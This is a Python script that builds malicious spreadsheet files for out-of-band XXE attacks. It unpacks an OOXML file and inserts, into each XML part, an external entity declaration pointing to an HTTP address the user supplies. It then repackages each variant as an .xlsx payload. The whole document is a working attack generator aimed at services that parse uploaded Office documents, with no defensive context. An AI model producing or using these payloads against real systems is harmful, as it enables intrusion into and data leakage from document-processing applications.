#!/usr/bin/python3

import os
import zipfile
import sys
import argparse
import magic
import shutil


def check_file(file):
    return zipfile.is_zipfile(file)


def prepare(file):
    os.mkdir('base')

    if check_file(file):
        with zipfile.ZipFile(file, 'r') as zipF:
            zipF.extractall(path='base')
    else:
        print('This file type is not supported. Aborting now')
        sys.exit()


def set_payload_positions():
    positions = os.popen('find base -type f').read()
    positions = positions.split('\n')
    return positions


def is_xml(file):
    file_type = magic.from_file(file)
    if 'XML' in file_type:
        return True
    else:
        return False


def embed_payload(file, ip):
    payload = "<!DOCTYPE x [ <!ENTITY xxe SYSTEM \"http://{}\"> ]><x>&xxe;</x>".format(ip)
    with open(file, 'r') as f:
        content = f.readlines()
        content = [x.strip() for x in content]
    f.close()

    content.insert(1, payload)

    f = open(file, 'w')
    for line in content:
        f.write(line + '\n')
    f.close()


def main():
    parser = argparse.ArgumentParser(description='Embed XXE payloads into OOXML files')
    
    parser.add_argument('-f', '--file', type=str, metavar='', required=True, help='base file')
    parser.add_argument('-i', '--ip-address', type=str, metavar='', required=True, help='ip address to be placed in payloads (OOB XXE)')
    
    args = parser.parse_args()

    prepare(args.file)
    positions = set_payload_positions()

    os.mkdir('payloads')

    for file in positions:
        if os.path.isfile(file):
            if is_xml(file):
                file_name = os.path.basename(file)
                tmp_dir = file_name + '.tmp'
                shutil.copytree('base', tmp_dir)

                new_file_name = str(file).replace('base', tmp_dir)
                embed_payload(new_file_name, args.ip_address)

                output = str(tmp_dir).strip('.tmp').replace('.', '_')
                shutil.make_archive(output, 'zip', tmp_dir)

                rnm = output + '.zip'
                new = output + '.xlsx'
                os.rename(rnm, new)

                shutil.move(new, 'payloads')
                shutil.rmtree(tmp_dir)

            else:
                pass
    shutil.rmtree('base')


if __name__ == '__main__':
    main()
